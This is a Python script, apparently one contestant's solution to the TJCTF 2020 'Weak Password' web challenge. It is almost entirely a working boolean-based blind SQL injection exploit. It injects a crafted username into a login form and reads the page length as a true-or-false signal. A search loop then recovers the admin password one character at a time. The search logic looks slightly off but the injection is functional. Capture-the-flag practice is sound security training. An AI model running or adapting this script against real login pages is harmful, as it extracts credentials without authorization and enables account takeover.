# TJCTF2020-Web Weak Password
# Coding by yctseng1227
import requests
import string

def inject(n, opr, char):
    url = 'https://weak_password.tjctf.org/login'
    payload = {"username": "admin' and unicode(substr(password, {})) {} unicode('{}')-- ".format(n, opr,char), "password": "123"}
    r = requests.post(url, data=payload)
    return True if len(r.text)==1842 else False #1842:OK



li = list(string.digits + string.ascii_lowercase)

res = ""
for i in range(1, 20):
    l = 0
    r = len(li) - 1

    if inject(i, '>', li[0]) == False:
        print('password: '+res)
        break

    while l <= r:
        mid = (l +(r+1)) // 2
        #print(l, r, mid)
        if inject(i, '=', li[mid]):
            #print('password['+str(i)+'] = '+li[mid])
            res = res + li[mid]
            break
        elif inject(i, '>', li[mid]):
            l = mid
            #print('password['+str(i)+'] > '+li[mid])
        elif inject(i, '<', li[mid]):
            r = mid
            #print('password['+str(i)+'] < '+li[mid])
        else:
            break
    print(res)

